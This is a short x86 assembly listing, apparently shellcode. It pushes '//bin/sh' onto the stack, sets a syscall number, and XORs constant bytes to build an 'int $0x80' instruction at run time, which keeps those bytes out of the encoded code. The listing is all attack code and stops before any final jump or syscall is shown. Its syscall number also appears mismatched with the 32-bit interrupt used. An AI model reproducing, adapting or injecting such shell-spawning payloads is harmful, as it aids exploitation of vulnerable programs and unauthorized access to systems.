
.globl main
.type  main @function
main:
    push $0x31
    pop  %eax
    xor  $0x31, %al
    push %eax
    push %eax
    pop  %ebx
    pop  %ecx

    push $0x68732f6e
    push $0x69622f2f

    push %esp
    pop  %ebx
    push $0x3b
    pop %eax
    
    push $0x2a
    push $0xAA
    pop  %edx
    xor  %edx, (%esp)
    push $0x67
    push $0xAA
    pop  %edx
    xor  %edx, (%esp)
    pop  %edx
    xor  %edx, 1(%esp)

